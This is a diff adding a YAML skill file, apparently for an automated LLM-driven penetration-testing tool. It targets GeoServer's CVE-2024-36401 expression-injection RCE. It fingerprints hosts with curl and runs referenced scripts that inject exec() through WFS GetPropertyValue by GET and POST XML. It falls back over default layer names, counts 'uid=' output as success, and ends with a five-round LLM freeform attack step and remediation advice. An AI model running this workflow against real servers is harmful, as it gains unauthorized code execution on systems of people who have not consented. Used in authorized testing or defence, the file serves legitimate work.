@@ -1,0 +1,107 @@
+skill_id: geoserver_rce
+name: "GeoServer 属性名表达式 RCE (CVE-2024-36401)"
+category: web_rce
+phase: foothold
+version: "1.0"
+
+match:
+  rules:
+    - fingerprint_contains: ["geoserver"]
+    - fingerprint_contains: ["GeoServer"]
+    - evidence_contains: ["geoserver"]
+    - evidence_contains: ["GeoServer"]
+    - evidence_contains: ["WFS", "WMS"]
+    - cve_matches: ["CVE-2024-36401"]
+
+probes:
+  - id: confirm_geoserver
+    description: "确认 GeoServer 存在并获取版本"
+    steps:
+      - command: |
+          curl -s {ENDPOINT}/geoserver/web/ --max-time 10 2>/dev/null
+        parse_rules:
+          - if_contains: ["GeoServer", "geoserver"]
+            set: { geoserver_confirmed: true }
+      - command: |
+          curl -s {ENDPOINT}/web/ --max-time 10 2>/dev/null
+        parse_rules:
+          - if_contains: ["GeoServer", "geoserver"]
+            set: { geoserver_confirmed: true, no_prefix: true }
+
+  - id: discover_layers
+    description: "通过 GetCapabilities 获取可用图层名"
+    depends_on: { geoserver_confirmed: true }
+    command: "bash {skill_dir}/scripts/discover_layers.sh {ENDPOINT}"
+    timeout: 20
+    parse_rules:
+      - if_regex: "LAYER_FOUND:(.+)"
+        set: { layer_discovered: true }
+      - if_regex: "BASE_URL:(.+)"
+        set: { base_url_found: true }
+      - if_contains: ["DEFAULT_LAYERS"]
+        set: { has_default_layers: true }
+
+exploit_paths:
+  - path_id: ows_rce
+    name: "OWS GetPropertyValue 表达式注入 RCE"
+    priority: 1
+    principle: |
+      通过 WFS GetPropertyValue 请求的 valueReference 参数注入
+      exec() 表达式。先用发现的图层名，再用默认图层名兜底。
+    conditions:
+      geoserver_confirmed: true
+    steps:
+      - id: rce_discovered_layer
+        description: "用发现的图层名尝试 RCE"
+        command: "bash {skill_dir}/scripts/rce_discovered_layer.sh {ENDPOINT}"
+        timeout: 60
+        success_criteria:
+          stdout_regex: "(uid=\\d+\\(\\w+\\)|GEOSERVER_RCE_SUCCESS)"
+        on_success: conclude_success
+        on_fail: rce_default_layers
+        evidence_capture:
+          shell_type: "rce_geoserver_ows"
+
+      - id: rce_default_layers
+        description: "用默认图层名遍历尝试 RCE"
+        command: "bash {skill_dir}/scripts/rce_default_layers.sh {ENDPOINT}"
+        timeout: 120
+        success_criteria:
+          stdout_regex: "(uid=\\d+\\(\\w+\\)|GEOSERVER_RCE_SUCCESS)"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_geoserver_default_layer"
+
+  - path_id: post_xml_rce
+    name: "POST XML WFS GetPropertyValue RCE"
+    priority: 2
+    principle: |
+      通过 POST XML 请求体发送 GetPropertyValue 请求。
+      某些配置下 GET 参数被过滤但 POST XML 不受限。
+    conditions:
+      geoserver_confirmed: true
+    steps:
+      - id: post_rce
+        description: "POST XML 方式执行 RCE"
+        command: "bash {skill_dir}/scripts/rce_post_xml.sh {ENDPOINT}"
+        timeout: 90
+        success_criteria:
+          stdout_regex: "(uid=\\d+\\(\\w+\\)|GEOSERVER_RCE_SUCCESS)"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_geoserver_post"
+
+  - path_id: llm_freeform
+    name: "LLM 自由推理（限定 GeoServer RCE 范围）"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+    conditions:
+      geoserver_confirmed: true
+
+remediation: |
+  1. 升级 GeoServer 至 2.25.2 / 2.24.4 / 2.23.6 或更高版本
+  2. 删除 gt-complex 模块中的 evaluate 评估功能
+  3. 限制 WFS/OWS 接口的公网访问
